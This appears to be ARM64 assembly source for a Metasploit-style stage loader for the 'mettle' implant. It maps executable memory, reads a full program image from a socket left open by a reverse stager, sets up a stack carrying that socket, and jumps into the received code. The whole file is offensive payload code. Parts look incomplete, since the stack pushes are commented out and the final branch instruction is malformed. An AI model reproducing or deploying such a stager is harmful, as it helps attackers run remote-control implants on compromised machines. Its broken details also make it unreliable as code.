.global _start

// Required symbols:
//   SIZE: size of the final payload
//   ENTRY: entry point offset from the start of the process image

.text
_start:
  // mmap the space for the mettle image
  mov x0, #0      // address doesn't matter
  ldr x1, =SIZE   // more than 12-bits
  mov x2, #7      // PROT_READ | PROT_WRITE | PROT_EXECUTE
  mov x3, #34     // MAP_PRIVATE | MAP_ANONYMOUS
  mov x4, #0      // no file
  mov x5, #0      // no offset

  ldr x8,=222     // __NR_mmap

  svc #0

  // recv the process image
  // x12 contains our socket from the reverse stager
  mov x2, x1      // recv the whole thing (I, too, like to live dangerously)
  mov x1, x0      // move the mmap to the recv buffer
  mov x0, x12     // set the fd

  ldr x8,=63      // __NR_read
  svc #0

  // set up the initial stack
  // The final stack must be aligned, so we align and then make room backwards
  // by _adding_ to sp.
  mov x4,sp
  and sp,x4, #-16      // Align
  add sp,sp, #36 + 4   // Add room for initial stack and prog name
  mov x4, #109      //  "m" (0,0,0,109)
  // push {x4}         // On the stack
  mov x4,#2         // ARGC
  mov x5,sp         // ARGV[0] char *prog_name
  mov x6,x12        // ARGV[1] int socket fd
  mov x7,#0         // (NULL)
  mov x8,#0         // (NULL) (Ending ENV)
  mov x9,#7         // AT_BASE
  mov x10,x1        // mmap'd address
  mov x11,#0        // AT_NULL
  mov x12,#0
  // push {x4-x12}

  // hack the planet
  ldr x0, =ENTRY
  add x0,x0, x1
  b x0
